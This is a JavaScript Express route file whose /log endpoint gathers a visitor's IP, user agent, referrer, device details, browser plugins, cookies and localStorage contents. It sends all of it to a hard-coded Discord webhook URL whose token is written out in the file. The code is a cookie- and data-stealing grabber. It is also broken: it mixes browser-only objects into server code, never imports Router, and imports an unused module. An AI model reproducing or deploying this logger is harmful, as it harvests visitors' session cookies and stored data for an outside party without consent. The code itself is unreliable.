import express from 'express';
import fetch from 'node-fetch'; // If using for HTTP requests
import { VM } from 'vm2'; // For executing code in a secure VM
import os from 'os';

const router = Router();

router.post('/log', async (req, res) => {
    const ip = req.body.ip || 'No IP logged';
    const userAgent = req.headers['user-agent'] || 'No user agent';
    const currentURL = req.headers.referer || 'No URL';
    const screenWidth = screen.width || 'Unknown';
    const screenHeight = screen.height || 'Unknown';
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    const memoryInfo = `${(os.totalmem() / (1024 ** 2)).toFixed(2)} MB` || 'Memory info not available';
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected';
    const batteryLevel = navigator.getBattery ? (await navigator.getBattery()).level * 100 : 'Unknown';
    const isCharging = navigator.getBattery ? (await navigator.getBattery()).charging : 'Unknown';
    const geolocation = 'Geolocation not available'; // You would need to implement a method to get this
    const cookies = document.cookie || 'No cookies available';
    const localStorageData = JSON.stringify(localStorage) || 'No local storage data';

    const logData = {
        content: '',
        embeds: [{
            title: "Comprehensive User Information Logged",
            fields: [
                { name: "Private IP", value: ip },
                { name: "User Agent", value: userAgent },
                { name: "Current URL", value: currentURL },
                { name: "Screen Resolution", value: `${screenWidth} x ${screenHeight}` },
                { name: "Time Zone", value: timeZone },
                { name: "Memory Info", value: memoryInfo },
                { name: "Hardware Concurrency", value: hardwareConcurrency },
                { name: "Connection Type", value: connectionType },
                { name: "Browser Plugins", value: plugins },
                { name: "Battery Level", value: `${batteryLevel}%` },
                { name: "Charging Status", value: isCharging ? 'Charging' : 'Not Charging' },
                { name: "Geolocation", value: geolocation },
                { name: "Cookies", value: cookies },
                { name: "Local Storage Data", value: localStorageData }
            ],
            color: 5814783,
            footer: {
                text: "Logged at " + new Date().toLocaleString()
            }
        }]
    };

    try {
        const webhookResponse = await fetch('https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
        });

        if (!webhookResponse.ok) {
            const errorText = await webhookResponse.text();
            console.error('Failed to send to Discord webhook:', webhookResponse.status, errorText);
        } else {
            console.log('Log sent to Discord successfully');
        }

        res.status(200).json({ message: 'Logged successfully' });
    } catch (error) {
        console.error('Error sending log to Discord:', error);
        res.status(500).json({ message: 'Failed to log' });
    }
});

export default router;
